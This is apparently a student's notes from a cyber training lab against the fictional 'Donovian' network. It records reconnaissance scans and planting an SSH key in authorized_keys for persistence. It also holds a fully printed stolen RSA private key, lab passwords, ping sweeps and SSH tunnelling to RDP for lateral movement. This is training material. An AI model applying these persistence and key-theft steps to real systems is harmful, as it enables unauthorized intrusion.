Donovian Post Exploitation (DPE)
XX Mar 2024
Start Time: 1300
Duration: 4 hours

Type of Operation: Cyber Intelligence, Surveillance and Reconnaissance (C-ISR)

Objective: Maneuver through Donovian-Extranet, identify and gain access futher into Donovian internal Cyberspace, it is believed that there is an network that acts as an internal DMZ between these to locations. Intelligence was able to identify the last octet of a system that resides in the Donovian internal Cyberspace.

Tools/Techniques: All connections will be established through SSH masquerades or web browser. Ports in use will be dependent on target location and are subject to change. Network scanning tools/technique usage is at the discretion of student. Credential reuse is authorized
Donovian Post Exploitation (DPE)
XX Mar 2024
Start Time: 1300
Duration: 4 hours

Type of Operation: Cyber Intelligence, Surveillance and Reconnaissance (C-ISR)

Objective: Maneuver through Donovian-Extranet, identify and gain access futher into Donovian internal Cyberspace, it is believed that there is an network that acts as an internal DMZ between these to locations. Intelligence was able to identify the last octet of a system that resides in the Donovian internal Cyberspace.

Tools/Techniques: All connections will be established through SSH masquerades or web browser. Ports in use will be dependent on target location and are subject to change. Network scanning tools/technique usage is at the discretion of student. Credential reuse is authorized

Scenario Credentials: FLAG = P05T3xpl01t5t@rtoF@ct1v1ty

Prior Approvals: Sudo usage and remote port forward is authorized. System dir walks from system roots, altering accounts/routing or tool uploads are authorized. Survey and access to newly discovered systems during C-ISR.

Scheme of Maneuver:
>Jump Box
->T1: 192.168.28.100
-->T3:x.x.x.9

Target Section:

T1
Hostname: Donovian_Extranet
IP: 192.168.28.100
OS: CentOS
Creds:Unknown
Last Known SSH Port: 2222
PSP: none
Malware: none
Action: Perform SSH masquerade and survey system. Identify redirection to the next target.

T3
Hostname: unknown
IP: x.x.x.9
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
PSP: Unknown
Malware: Unknown
Action: Gain access; survey host and map Donovian internal Cyberspace.
Scenario Credentials: FLAG = P05T3xpl01t5t@rtoF@ct1v1ty

Prior Approvals: Sudo usage and remote port forward is authorized. System dir walks from system roots, altering accounts/routing or tool uploads are authorized. Survey and access to newly discovered systems during C-ISR.

Scheme of Maneuver:
>Jump Box (10.50.12.226, twvqQ9ahZGo2)
	10.10.28.40/27
->T1: 192.168.28.100
-->T3:x.x.x.9

Target Section:

T1
Hostname: Donovian_Extranet
IP: 192.168.28.100
OS: CentOS
Creds:Unknown
Last Known SSH Port: 2222
PSP: none
Malware: none
Action: Perform SSH masquerade and survey system. Identify redirection to the next target.

proxychains nmap --script http-enum 192.168.28.100

PORT     STATE SERVICE
80/tcp   open  http
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/login.php: Possible admin folder
|_  /img/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
2222/tcp open  EtherNetIP-1Xliyj4VBTgzNY3SQ+WY/LG100FOLi+dCqVeSDEKu6oWl5VjYk5ShjrzTsa5ZkbH7xdkEWlulGgPzYwcNFwTijpNqzOUALUuVrF0xe3UIZZJWyrnfaOsNuj59CxcKjLWPRJ+PjK3JcyJ5BZV6Sc57t6f+sG+iDWkBRCLx8jthSgwoKiJ2fioNzAfII6VALycDEf2irw7qGtdhVSnYdMTQqEObLx/PFxZvmx6HX student@lin-ops 

cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/bin/bash
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
comrade:x:1001:1001::/home/comrade:/bin/bash
mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false

www-data
ssh-keygen -t rsa
cat ~/.ssh/id rsa.pub

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDMnUROjsdsM4dbziBumkNgvwfxwzIBaAiC+QZwDIqVUnijnWM3aCI+9ztECDkCFtQYMrJXvESp/xlJsaWzvXMwNF5/oGaSnASy5M77BQZgB7S3S9DXliyj4VBTgzNY3SQ+WY/LG100FOLi+dCqVeSDEKu6oWl5VjYk5ShjrzTsa5ZkbH7xdkEWlulGgPzYwcNFwTijpNqzOUALUuVrF0xe3UIZZJWyrnfaOsNuj59CxcKjLWPRJ+PjK3JcyJ5BZV6Sc57t6f+sG+iDWkBRCLx8jthSgwoKiJ2fioNzAfII6VALycDEf2irw7qGtdhVSnYdMTQqEObLx/PFxZvmx6HX student@lin-ops

ls -la /var/www/.ssh
mkdir /var/www/.ssh


echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDMnUROjsdsM4dbziBumkNgvwfxwzIBaAiC+QZwDIqVUnijnWM3aCI+9ztECDkCFtQYMrJXvESp/xlJsaWzvXMwNF5/oGaSnASy5M77BQZgB7S3S9DXliyj4VBTgzNY3SQ+WY/LG100FOLi+dCqVeSDEKu6oWl5VjYk5ShjrzTsa5ZkbH7xdkEWlulGgPzYwcNFwTijpNqzOUALUuVrF0xe3UIZZJWyrnfaOsNuj59CxcKjLWPRJ+PjK3JcyJ5BZV6Sc57t6f+sG+iDWkBRCLx8jthSgwoKiJ2fioNzAfII6VALycDEf2irw7qGtdhVSnYdMTQqEObLx/PFxZvmx6HX student@lin-ops
" >> /var/www/.ssh/authorized_keys

proxychains ssh user@address -p [port]
explore items.  make sure you always do ls -a (finds hidden items).

Extranet - 
look under /usr/share

# The following lines are desirable for IPv6 capable hosts
::1 ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
ff02::3 ip6-allhosts
192.168.150.253 Donovian-Intranet

CTF 3:

student@lin-ops:~$ zcat backup.tar.gz
.ssh/0000755000175100017510000000000014424746274011557 5ustar  comradecomrade.ssh/id_rsa.pub0000644000175100017510000000063314361536573013531 0ustar  comradecomradessh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDgP2uXYcb+W40AxfGwjsfFlA6jR1/zL711bXQAjvAuEv5L6tNVkdDyNNdD66Q8Jwsh8DzLPDqeOTmQr7FDMAO5sCD7z+R+kEpvoVzBsgKXL22l2ipxGtCxJzhI1HT16fYB1BZPqmZpJylBdym3KN0yZvgFMs7B0jb9SFkh/+Jp1OxzohX88Xc2j+Dk1URkY0xZOTvOgYafFjbFINaeuVMqb+YeEyj9jxxNFo69F4selrftFmaf5AupSiW+P8GjOReArWBxEgvcLqshl+gTuf817jxb2terzW8f/qVK09XsepMPPZ5elfUqSzK1N3a4sTu1+0EsGALGjB/iSXbeCmcD comrade@extranet.site.donovia
.ssh/id_rsa0000600000175100017510000000321714361536573012735 0ustar  comradecomrade-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA4D9rl2HG/luNAMXxsI7HxZQOo0df8y+9dW10AI7wLhL+S+rT
VZHQ8jTXQ+ukPCcLIfA8yzw6njk5kK+xQzADubAg+8/kfpBKb6FcwbICly9tpdoq
cRrQsSc4SNR09en2AdQWT6pmaScpQXcptyjdMmb4BTLOwdI2/UhZIf/iadTsc6IV
/PF3No/g5NVEZGNMWTk7zoGGnxY2xSDWnrlTKm/mHhMo/Y8cTRaOvReLHpa37RZm
n+QLqUolvj/BozkXgK1gcRIL3C6rIZfoE7n/Ne48W9rXq81vH/6lStPV7HqTDz2e
XpX1KksytTd2uLE7tftBLBgCxowf4kl23gpnAwIDAQABAoIBAQCeX4wQDOkqSOQr
kKDiDeS/AJLZ9BWqvaOzpEqR/mFYWOeqHD2HKIWGGZWSjYCfTv/Ix09YRcAscMPc
EIlDp0xqPx78WNXKIQPBFRhaX+r+dWud/5eL6+FJzCYvIYU9DDBHGE9tki3jw9ma
N5uJlN2rtBckLL7jGiDl/sucfIieLoSSvqazEaNniVQu9kri6y8hWGFQyFCmIJBg
DNbU94XRNfyMjMOMbNSzHdB16ndXixQ97mok8MMaZ46Jmm7Uh4xY/fSVSyWyRjr8
e8aXyOt7GZhKSgVOqEpy9LlY+JLSsGKtZcW10F1IaHvf8GKlx6171xl1kS2M5gKU
8N5q2TUhAoGBAP3tsL/ljXZJcvml9eA1cgpEpnFg5fdxw4fL8g4Vh5GSj/nnaNhv
Vg/rVq8vbwPJE01cPdpXxKe/OoGVpyAy9E12ryHPUwwf38RkK7QllU7XZApuloMk
hEFj6aQQUK0gMP/rtw5KB75RpnDEZQjUcPu2GwcOFtCaHPu3pQ6BpLpRAoGBAOIT
vnRizDh+pQyWxfulsnFfYdf9OIZ2njHcIg0/ez9E2zHwcrpjpLw6RElZ0S9rZwsv
PNLcNt0HtXhyVFfWoihpH7FR+YWhyxHYHcjdU46GenfnsKO0rjp/ruEx6u05AhRl
9JQNxi/Z0q3zE8HxzM0QQsgG0L6FX86MOOaOf6MTAoGAbQHqzJZY4hyp1O4f3T5U
VIAgC7ATSOR3kgZFRTKM3jtSv29OHQu+oFrg/ZeZSsC5Ho6opuDitThsf1ClTDdT
lSWMDTGZby0HvKFb+ZvgutXQRoIu7uFwPToNBLdUSt306whfryysolEe6G4HCYFZ
d1U3yRGNTcO7CXxOySlyc+ECgYEA177bzBnUpj1FqQPhoEr6RXMu3n5KiRd91Dst
S9M+/JvrSncaJYGd3fsE27MZC9XFGklUFC4PNVN7/Juunby4NzRLCF8gbkR+lGLX
2a5NZQA0s2SpjzCH7E+ZRlLqzMPQlkLN6tRSQ6vtgA8u1bC5LyDLejP21TpWubfb
PTrT130CgYEAmPSziwbA1SQjgmVIjkkKH+/pR6KFfV4q1apukhGz29M+b35UpPyS
VBLPYSS+BgJHlBdt9JVaIh/x0js4rWjo25XS/LbJ4lUCHdkAuSaGzTSaAM3wfPaV
vmY0+I0N+fupndvL2bUWHR2Ftle+ZMHFSHgn2jLvkOfjful9XKjs2Ys=
-----END RSA PRIVATE KEY-----

   41  gunzip backup.tar.gz 
   42  tar xdf backup.tar 
   43  tar xdf backup.tar C
   44  mkdir stolenkeys
   45  tar -xdf backup.tar C /stolenkeys
   46  tar -xdf backup.tar C ./stolenkeys
   47  tar -xvf backup.tar C ./stolenkeys
   48  tar -xvf backup.tar -C ./stolenkeys
   49  history

you need to first chmod 600 the directory
then do a ssh -i command. see the fg.
proxychains ssh -i stolenkeys/.ssh/id_rsa comrade@192.168.150.253 -p 3201
cat /etc/hosts

comrade@lin:/var/log$ 


comrade::StudentMidwayPassword

so when on box, go into root - sudo su. 
now you can find interesting things.  cd root, allows you to see files in that focus. 

av - search for items from root
whereis [program]
find files using find command

Beaconing - 

sudo tcpdump -i any -nn -tttt 'tcp[tcpflags] & tcp-syn != 0'

2026-01-05 21:54:48.850847 IP 192.168.28.135.60042 > 192.168.150.253.12326: Flags [S], seq 3959638694, win 64240, options [mss 1460,sackOK,TS val 2073773251 ecr 0,nop,wscale 7], length 0
2026-01-05 21:54:50.854684 IP 192.168.28.135.57184 > 192.168.150.253.12327: Flags [S], seq 2646198192, win 64240, options [mss 1460,sackOK,TS val 2073775255 ecr 0,nop,wscale 7], length 0
2026-01-05 21:54:52.858569 IP 192.168.28.135.47122 > 192.168.150.253.12328: Flags [S], seq 4224531425, win 64240, options [mss 1460,sackOK,TS val 2073777259 ecr 0,nop,wscale 7], length 0
2026-01-05 21:54:54.862392 IP 192.168.28.135.33594 > 192.168.150.253.12329: Flags [S], seq 1546512516, win 64240, options [mss 1460,sackOK,TS val 2073779263 ecr 0,nop,wscale 7], length 0
2026-01-05 21:54:56.866227 IP 192.168.28.135.54222 > 192.168.150.253.12330: Flags [S], seq 1338178461, win 64240, options [mss 1460,sackOK,TS val 2073781266 ecr 0,nop,wscale 7], length 0
2026-01-05 21:54:58.870375 IP 192.168.28.135.49166 > 192.168.150.253.12331: Flags [S], seq 3493280727, win 64240, options [mss 1460,sackOK,TS val 2073783270 ecr 0,nop,wscale 7], length 0
2026-01-05 21:55:00.874258 IP 192.168.28.135.56192 > 192.168.150.253.12332: Flags [S], seq 28037892, win 64240, options [mss 1460,sackOK,TS val 2073785274 ecr 0,nop,wscale 7], length 0
2026-01-05 21:55:02.878358 IP 192.168.28.135.52250 > 192.168.150.253.12333: Flags [S], seq 3786609444, win 64240, options [mss 1460,sackOK,TS val 2073787278 ecr 0,nop,wscale 7], length 0
2026-01-05 21:55:04.882408 IP 192.168.28.135.43474 > 192.168.150.253.12334: Flags [S], seq 4075447527, win 64240, options [mss 1460,sackOK,TS val 2073789282 ecr 0,nop,wscale 7], length 0
2026-01-05 21:55:06.886309 IP 192.168.28.135.57438 > 192.168.150.253.12335: Flags [S], seq 1279427970, win 64240, options [mss 1460,sackOK,TS val 2073791286 ecr 0,nop,wscale 7], length 0
2026-01-05 21:55:08.890115 IP 192.168.28.135.43992 > 192.168.150.253.12336: Flags [S], seq 3544943525, win 64240, options [mss 1460,sackOK,TS val 2073793290 ecr 0,nop,wscale 7], length 0
2026-01-05 21:55:10.894190 IP 192.168.28.135.55114 > 192.168.150.253.12337: Flags [S], seq 2442114123, win 64240, options [mss 1460,sackOK,TS val 2073795294 ecr 0,nop,wscale 7], length 0
2026-01-05 21:55:12.898115 IP 192.168.28.135.44536 > 192.168.150.253.12338: Flags [S], seq 1084237576, win 64240, options [mss 1460,sackOK,TS val 2073797298 ecr 0,nop,wscale 7], length 0
2026-01-05 21:55:14.902191 IP 192.168.28.135.37942 > 192.168.150.253.12339: Flags [S], seq 4156793944, win 64240, options [mss 1460,sackOK,TS val 2073799302 ecr 0,nop,wscale 7], length 0
2026-01-05 21:55:16.906415 IP 192.168.28.135.51376 > 192.168.150.253.12340: Flags [S], seq 280007023, win 64240, options [mss 1460,sackOK,TS val 2073801306 ecr 0,nop,wscale 7], length 0
2026-01-05 21:55:18.910408 IP 192.168.28.135.49734 > 192.168.150.253.12341: Flags [S], seq 2812455719, win 64240, options [mss 1460,sackOK,TS val 2073803310 ecr 0,nop,wscale 7], length 0

nc -l port (destination)

root@lin:/# nc -l 51264
bash: /bin/nc: Permission denied
root@lin:/# chmod +x /bin/nc
root@lin:/# chmod +x /bin/nc
root@lin:/# nc -l 51264
^C
root@lin:/# nc -l 12340
aEU0SVdScDJLM3Q3NU9Ib1UxZDMK
root@lin:/# ip nei

crontab -l from root gives you when you look at a log.

Run a ping sweep:

www-data@extranet:~$ for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) 2>/dev/null ;done
64 bytes from 192.168.1.1: icmp_seq=1 ttl=63 time=0.256 ms
64 bytes from 192.168.1.2: icmp_seq=1 ttl=62 time=0.397 ms
www-data@extranet:~$ for i in {1..254} ;do (ping -c 1 192.168.$i.9 | grep "bytes from" &) 2>/dev/null ;done
64 bytes from 192.168.28.9: icmp_seq=1 ttl=127 time=2.34 ms
www-data@extranet:~$ 

Then run a port scan using nmap - 

nmap -p- -T5 [ip addresss]

Build a local
Connect using xfree rdp

schtasks /query /fo LIST /v``   # List all Tasks in List format
schtasks /query /fo LIST /v | Select-String -Pattern "STRING OR REGEX PATTERN"

T3
Hostname: unknown
IP: x.x.x.9
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
PSP: Unknown
Malware: Unknown
Action: Gain access; survey host and map Donovian internal Cyberspace.



map scan report for 192.168.28.9
Host is up (0.0010s latency).
Not shown: 65519 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5040/tcp  open  unknown
5985/tcp  open  wsman
5986/tcp  open  wsmans
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49672/tcp open  unknown


ssh comrade@localhost -p 1111 -L 2222:192.168.28.9:3389




   10  sudo apt install multi-lib
   11  sudo apt install multilib
   12  sudo apt install gcc-multilib
   13  sudo apt-get install lib32z1
   14  openstack
   15  gdb
   16  sudo apt install open-vm-tools open-vm-tools-desktop
   17  ifconfig
   18  ipaddress show
   19  ip addresss show
   20  ip address show
   21  ifconfig
   22  sudo su -
   23  xfreerdp /u:comrade /p:StudentMidwayPassword /v:192.168.28.9 
   24  xfreerdp /u:comrade /p:StudentMidwayPassword /v:192.168.28.9:2222 
   25  xfreerdp /u:comrade /p:StudentMidwayPassword /v:localhost:2222 
   26  history
